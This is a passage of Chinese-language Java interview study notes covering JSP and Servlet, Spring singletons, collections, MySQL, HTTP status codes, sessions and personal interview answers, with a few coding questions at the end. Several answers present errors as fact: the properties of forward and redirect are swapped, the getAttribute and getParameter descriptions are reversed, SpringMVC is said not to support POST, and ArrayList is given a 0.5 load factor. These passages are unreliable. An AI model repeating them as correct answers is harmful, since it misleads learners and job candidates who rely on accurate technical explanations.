（3）JSP允许特殊标签直接嵌入到HTML页面，HTML内容与JAVA内容也可放在单独文件中，HTML内容的任何变动都会自动编译装进服务程序；而Servlet独立处理静态逻辑跟动态逻辑，任何改动都要重启服务器<br> （4）Servlet需要在web.xml配置，而JSP不用<br> （5）JSP主要在视图层负责显示，Servlet主要在控制层，负责调度联系。</li>\n</ol>\n<p>23.JSP有哪些动作？作用分别是什么？<br> 答：<br> Jsp:include：页面被请求时引入一个文件<br> Jsp:usebean：使用Javabean<br> Jsp:setProperty：设置Javabean的属性<br> Jsp:getProperty：获取Javabean的属性<br> Jsp:forward：请求转发页面<br> Jsp:plugin：为Java插件生成Object或EMBED标记</p>\n<p>24.Servlet是什么？<br> 答：一门用于开发动态web资源的技术，若想要开发一个动态web资源，则①编写一个Java类，实现servlet接口②把编写好的Java类部署到web服务器中。</p>\n<p>25.Servlet的生命周期：</p>\n<p>26.Servlet的方法：<br> Void init()<br> Void Service()<br> Void destory()<br> getServletInfo()<br> getServletConfig()</p>\n<p>27.Get跟post的区别？<br> ①get是向浏览其获取数据，而post是向浏览其发送数据<br> ②get是不安全的，数据被放在请求的URL中，而post的所有请求对用户是不可见的<br> ③get的传输量小，post的传输量大<br> ④get是form表单默认的方法，SpringMVC不支持POST，得重定向或在配置文件设置</p>\n<p>28.Forward跟redirect的区别？<br> 答：①forward是服务器行为，request一次，会改变URL地址，可共享转发前后的数据，效率比较高<br> ②redirect是客户端行为，request两次，不会改变URL地址，数据不可共享，效率比较低</p>\n<p>29.JSP的工作原理<br> 答：JSP是一种简易版的Servlet，但与Servlet的工作方式不太一样，Servlet是先编译后部署的，而JSP是先部署后编译的，JSP会在客户端第一次请求JSP文件的时候被编译为httpJSPPage类，该类会临时存放在服务器工作目录里。</p>\n<p>30.getAttribute跟getParameter的区别？<br> 答：getAttribute获取的是POST/GET传递参数值和URL中的参数，类型是String<br> getParameter获取的是对象容器中的数值，类型是Object</p>\n<p>31.JSP内置对象：request、response、session、page、pageContext、application、config、execution、out<br> 四大作用域：<br> Request：代表与一个请求相关的对象和属性<br> Session:相当于一个容器，存放一个用户体验相关的对象和属性<br> Applicaton:获取的是与整个web应用程序相关的对象和属性<br> Page:获取的是与页面相关的对象和属性</p>\n<p>32.JSP常用指令：<br> 答：inlcude：静态页面被请求时引用一个文件<br> Tarlib引入一个标签库<br> Page；定义页面一些属性</p>\n<p>33.会话跟踪技术：session、cooike、重写URL、隐藏表单域</p>\n<p>34.异常类型<br> 答：<br> 空指针：nulPointerException<br> 数组下表越界：IndexoutOfBoundsException<br> 被除数为零：ArithmeticException<br> 类型转换异常：classcastException<br> 找不到类：classNotFoundException<br> 找不到bean<br> Cannot resolve the method “GET”</p>\n<p>36.如何快速适应岗位<br> ①与周围的同事搞好人际关系，尽快适应工作氛围<br> ②把工作需要掌握的技能点学扎实，尽快上手工作，高效工作。<br> ③实际工作中有不懂的要多去问前辈。</p>\n<p>37.Super的用法：<br> ①Super.变量或对象<br> ②super.方法<br> ③super.构造器</p>\n<p>38.List的实现类<br> 答：ArrayList,LinkedList,Vector<br> 增 O(n) O(1)<br> 删 O(n) O(1)<br> 查 O(1) O(n)</p>\n<p>红黑树的复杂度<br> 增 O(logn)<br> 删 O(logn)<br> 查 O(logn)</p>\n<p>39.GIT常用的指令：<br> Status:查看仓库状态<br> Log:查看日志<br> Commit-m:提交描述<br> Checkout:把没保存的删除<br> reset:把文件是暂存的状态取消</p>\n<p>40.Spring是如何解决并发访问的线程安全性问题的？<br> 答：因为SpringMVC的Controller是singleTon的，意味着每个request会公用一个instance，这样会导致数据交错杂糅的问题。<br> ①在Controller中使用ThreadLocal变量<br> ②在Spring配置文件中配置Controller为prototype</p>\n<p>ThreadLocal：是一个线程内部的存储类，可以在指定线程内存储数据，数据存储后，只有指定线程可以得到存储数据</p>\n<p>41.设计模式中的singleton与spring中的singleton不一样<br> 答：设计模式中的singleton是classloader里只有一个class<br> 而spring中的singleton是每一个IOC容器里只有一个bean</p>\n<p>42.Spring为什么要用singleton？为什么不用静态方法?<br> 答：提高性能，每个容器只有一个Bean，这个bean是线程共享的。但是得保证不能不出修改bean的方法，不然不能保证线程安全。<br> 使用静态方法，失去了多态的优越性，不符合OOP的思想，使程序难以维护。</p>\n<p>43.如何解决高并发的问题？<br> 答：①使用缓存，NOSQL数据库如Redis、MongoDB<br> ②优化数据库表结构，分库分表<br> ③使用消息队列<br> ④尽量使用HTML静态页面<br> ⑤使用分布式，搭建集群</p>\n<p>44.进程间通信的方法？<br> 答：①管道<br> ②信号<br> ③使用socket套接字<br> ④消息队列</p>\n<p>45.为什么要转软件开发？你觉得相对于计算机专业的优势是什么？<br>  答：因为从小就接触电脑，对电脑比较熟悉。并且能长时间对着电脑。然后是对本专业的工作不感兴趣，两个哥哥都是做软件开发的，可能对我有点引导的作用，然后我接触了Java之后也比较感兴趣，并且决定了未来就奋斗在这个行业，并且有自己的职业规划，前面1-2年主要是学好技术，然后看工作之后的情况，大概率是往Java架构师或者高级工程师方向走，小概率会考虑转java大数据。<br>  优势：因为这个行业是我自己主动选择的，很多大学生再选专业的时候不知道这个专业是干什么的，最后就听别人说就选了，而我是自己选择的，而且参考两个哥哥，我也知道他们的工作是996，即便如此我也毅然选择了这个岗位，而且我对自己的学习热情有足够的信心，能够长时间跟着学习。</p>\n<p>46.优点：做事特别认真，负责任，把工作放在第一位置，工作效率也不错。<br> 缺点：自己专注做事情的时候不喜欢理别人，给人看起来不好交流。还有比较年轻没经验，比较浮躁心急。</p>\n<p>47.数据库连接步骤<br> ①加载JDBC驱动<br> ②提供JDBC连接的URL<br> ③创建statement对象<br> ⑤执行SQL语句<br> ⑥处理结果<br> ⑦关闭连接（JDBC对象）</p>\n<p>48.jQuery获取属性的方法：</p>\n<p>  这是一个DIV </p>\n<p>$(“#id”).attr(“name”)<br> $(“#id”).attr(“jy”)</p>\n<p>49.Limit(value1,value2)：参数1为行数开始，参数2为行数目</p>\n<p>50.JDK1.8新特性：<br> ①出现lambda表达式（匿名内部类）<br> ②红黑树数据结构<br> ③时间日期API（localDate、localTime、localDateTime）<br> ④接口可以定义静态方法跟default方法</p>\n<p>51.String常用的方法：toString,hashCode,equals,charAt,trim,toArrayChar,subString…</p>\n<p>52.http是无状态协议，80端口<br> https是由SSL和HTTP协议构建的可以进行加密传输跟身份验证的协议，443端口</p>\n<p>53.端口是用于区分进程的，IP是电脑的网络地址，URL是访问资源路径。</p>\n<p>54.状态码<a href=\"https://blog.csdn.net/xinxin19881112/article/details/6565823\">https://blog.csdn.net/xinxin19881112/article/details/6565823</a><br> 200：正常访问<br> 3xx：跟重定向有关<br> 403：forbideen，禁止访问<br> 404：找不到资源，一般为URL写错，页面跳转出错等。<br> 500：服务器出错，如静态页面标签、属性写错。。</p>\n<p>55.您了解我们公司吗？<br> 答：华讯网络系统有限公司、华讯网络存储系统有限公司<br> 世界500强电子科技集团，还是一家国企。云计算跟大数据是最吸引我的。为金融、电信、交通、甚至政府军队等行业提供IT解决方案。</p>\n<p>56.统一建模语言：UML</p>\n<p>57.使用Springmvc有什么好处：<br> 答：Spring是用来开发java  web主流的框架，相比于之前的用Servlet开发web，一定程度上简化了工作量，使用servlet的话需要每个请求都去web.xml中配置一个servlet节点，而使用Springmvc中的dispatchServelt他会拦截所有的请求，找到合适的处理器，所以只需要配置一个dispatchServlet就可以了。</p>\n<p>58.Mysql的性能优化？<br> 答：<br> 表的设计合理化（符合三大范式）<br> 优化配置my.ini<br> 适当添加索引<br> 读写分离</p>\n<p>59.为什么要使用单例模式？单例模式有几种实现方式？什么情况下要用到单例模式？<br> 单例模式可以保证在一个类中只有一个该对象，节省了系统资源，对于一些需要频繁创建销毁的对象，使用单例模式可以提高性能<br> 懒汉式（调用的时候再进行初始化，可以保证线程安全，防止指令重排，双重检查优化）<br> 饿汉式（类加载的时候就进行初始化）<br> 静态内部类（在饿汉模式基础上通过类的加载过程原理进行延时加载）<br> 枚举<br> 双重校验锁<br> 序列化<br> 需要经常创建和销毁的对象，创建对象时消耗资源过多但是又要经常使用的对象，如数据源，Session等</p>\n<p>60.索引要在什么情况下使用？<br> 答：（1）关联查询的外键字段要加索引<br> （2）会被排序的栏位（被放在order by方法中）<br> （3）会被查询的栏位（被放在where方法中）<br> （4）会被groud的栏位</p>\n<p>61.外键的作用？<br> 答：保证数据库的一致性，完整性。你插入表2学号字段的值必需要求在表1的学号字段能找到。 同一时候。假设你要删除表1的某个学号字段。必须保证表2中没有引用该字段值的列，否则就没法删除。</p>\n<p>62.Form表单的请求提交跟AJAX请求的提交<br> <a href=\"https://www.cnblogs.com/xiao-xue-di/p/11237154.html\">https://www.cnblogs.com/xiao-xue-di/p/11237154.html</a></p>\n<p>63.面向对象分析OOA(analysis) 面向对象方法OOD(Designe) 面向对象编程OOP(programming)</p>\n<ol>\n<li></li>\n</ol>\n<p>select count(*) from tb; ===&gt; row_size<br> select count(1) from tb; ====&gt;row_size<br> select count(null) from tb; ====&gt;0<br> select count(filed_has_null) from tb; =====&gt; row_size - null_row_size<br> count函数的参数值为null的话,将累加0,参数值不为null将累加1.</p>\n<p>65.Math常用函数：<br> 答：<br> Math.sqrt() : 计算平方根<br> Math.cbrt() : 计算立方根<br> Math.pow(a, b) : 计算a的b次方<br> Math.max( , ) : 计算最大值<br> Math.min( , ) : 计算最小值<br> Math.abs() : 取绝对值<br> Math.ceil(): 天花板的意思，就是逢余进一<br> Math.floor() : 地板的意思，就是逢余舍一<br> Math.rint(): 四舍五入，返回double值。注意.5的时候会取偶数<br> Math.round(): 四舍五入，float时返回int值，double时返回long值</p>\n<ol>\n<li></li>\n<li><p>广度优先遍历、深度优先遍历<a href=\"https://www.cnblogs.com/nr-zhang/p/11236369.html\">https://www.cnblogs.com/nr-zhang/p/11236369.html</a></p>\n</li>\n</ol>\n<p>68.操作系统中进程调度策略有几种？<br> ①先来先服务算法<br> ②优先级调度算法<br> ③时间片论转调度算法<br> ④多级反馈调度算法</p>\n<p>69.父子类初始化顺序：<br> 父类静态代变量、<br> 父类静态代码块、<br> 子类静态变量、<br> 子类静态代码块、<br> 父类非静态变量（父类实例成员变量）、<br> 父类构造函数、<br> 子类非静态变量（子类实例成员变量）、<br> 子类构造函数。</p>\n<p>70.linux下如何重启nginx<br> ./nginx -s reload</p>\n<p>71.双亲委派机制<br> 答：</p>\n<p>AppClassLoader-&gt;是否加载过-&gt;ExtentClassLoader-&gt;是否加载过-&gt;BootstrapClassLoader-&gt;是否加载过，若无，则自己加载-&gt;自己无法加载-&gt;ExtendClassLoader加载-&gt;自己无法加载-&gt;AppClassLoader-&gt;无法加载-&gt;ClassNotFoundException</p>\n<p>72.Java中的引用类型：<br> 强引用：Object o = new Object();栈里的o指向堆里的Object对象，最普通的引用。<br> 软引用：软引用本身也是一个对象，正常不会被回收，当内存空间不足的时候，垃圾回收器回收软引用的对象。（非常适合当缓存，大对象的缓存，常用对象的缓存）<br> 弱引用：遇到GC()就会被回收（没有容器指向的时候就需要清楚的缓存，ThreadLocal,WeakHashMap）<br> 虚引用：垃圾回收器看见马上回收，永远get不到那个对象，并且当对象被回收时，会把信息加到QUEUE队列里。常用于管理堆外内存：通过QUEUE检测到对象被回收，然后清除堆外内存。</p>\n<p>73.ArraysList的扩容机制：默认10个元素，负载因子0.5<br> 74.HashMap的扩容机制：默认16个元素，负载因子0.75</p>\n<p>75.HashMap的存储原理<br>  在JDK1.8之前，HashMap底层数据结构是数据加链表。hashMap.put方法传入一个K,V对象，对象被转换成Entry(k,v)对象,然后调用该对象key值hashcode方法，对返回的hashcode进行（hashcode&amp;数组长度-1）算法后算出下标，放入数组中，如果不同的对象且hashcode不同而存放的位置相同，则称发生了hash冲突。若对象hashcode相同，则会遍历元素进行equals进行比较，若有返回true的，则进行覆盖，否则被视为全新对象添加在链表末尾（JDK1.8之后，JDK1.8之前是头插入法）。如果链表长度大于8则转换为红黑树，如果小于6则重新退化成链表。</p>\n<p>76.我看到招聘会上说会有去上海集体培训，这个培训是什么时候去，实习的时候还是等正式入职的时候。</p>\n<p>平时工作会不会经常出差。项目组大概有多少个人，人员分配是怎么样的。<br> 薪资架构大概是怎么样的?五险一金怎么分配?</p>\n<p>77.如何定义一个ajax函数：</p>\n<p>$.ajax({<br> Type:<br> Url:<br> dataType:<br> Data:<br> });</p>\n<p>78.TCP/IP传输原理：</p>\n<p><img src=\"https://www.icode9.com/i/ll/?i=20210102144928352.png?,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0Jhc2NvMQ==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p>\n<p>79.TCP三次握手：<br> <img src=\"https://www.icode9.com/i/ll/?i=20210102144912778.png?,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0Jhc2NvMQ==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p>\n<p>80.Session的工作原理<br>  答：用户第一次请求的时候，服务器会创建一个Session对象，并存入到服务器的Session列表中，key为一个32位长度随机字符串SessionId，value为对应的Session对象。SessionId被包装成Cookie返回给浏览器，浏览器接受到Cookie后会保存在浏览其缓存中，下次再请求时请求头会携带该Cookie。</p>\n<ol>\n<li><img src=\"https://www.icode9.com/i/ll/?i=20210102144951440.png?,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0Jhc2NvMQ==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></li>\n</ol>\n<p><strong>标签：</strong><a href=\"https://www.icode9.com/tags-JAVA-0.html\">JAVA</a>,<a href=\"https://www.icode9.com/tags-%E5%AF%B9%E8%B1%A1-0.html\">对象</a>,<a href=\"https://www.icode9.com/tags-Spring-0.html\">Spring</a>,<a href=\"https://www.icode9.com/tags-%E9%9D%A2%E7%BB%8F-0.html\">面经</a>,<a href=\"https://www.icode9.com/tags-%E7%BA%BF%E7%A8%8B-0.html\">线程</a>,<a href=\"https://www.icode9.com/tags-%E6%96%B9%E6%B3%95-0.html\">方法</a>,<a href=\"https://www.icode9.com/tags-%E5%8A%A0%E8%BD%BD-0.html\">加载</a><br> 来源： <a href=\"https://blog.csdn.net/Basco1/article/details/112096416\">https://blog.csdn.net/Basco1/article/details/112096416</a></p>\n<ol start=\"81\">\n<li>只要进入了try catch语句块，finally一定会被执行。</li>\n</ol>\n<p>除了System.exit(0),或者线程被打断。try catch中的return对finally是无效的，finally中的return会覆盖上面的return</p>\n<h1 id=\"美的\"><a href=\"#美的\" class=\"headerlink\" title=\"美的\"></a>美的</h1><p>1.递归逆序链表</p>\n<p>2.int[]最大的乘积</p>\n<p>3.消除序列(东南西北)</p>\n<p>4.蚂蚁找食物</p>\n"}]